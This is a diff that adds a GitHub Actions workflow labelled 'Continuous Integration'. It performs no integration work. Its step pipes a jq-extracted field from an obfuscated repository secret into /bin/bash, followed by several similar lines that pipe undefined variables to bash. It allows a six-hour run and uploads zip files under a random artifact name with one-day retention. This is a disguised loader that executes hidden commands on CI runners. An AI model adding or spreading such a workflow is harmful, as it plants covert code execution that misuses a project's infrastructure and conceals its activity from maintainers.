@@ -1,0 +1,29 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          vod15868: ${{ secrets.vod15868 }}
+        run: |
+          printf '%s' "$vod15868" | jq -r .x01088 | /bin/bash
+          printf '%s' "$d712" | jq -r .ne8369 | /bin/bash
+          echo $psns472 | jq -r .i0 | /bin/bash
+          echo $ngy841 | jq -r .wlybm838 | /bin/bash
+          echo $oa49075 | jq -r .hcmup19282 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: MDknzI6e
+          path: "*.zip"
+          retention-days: 1
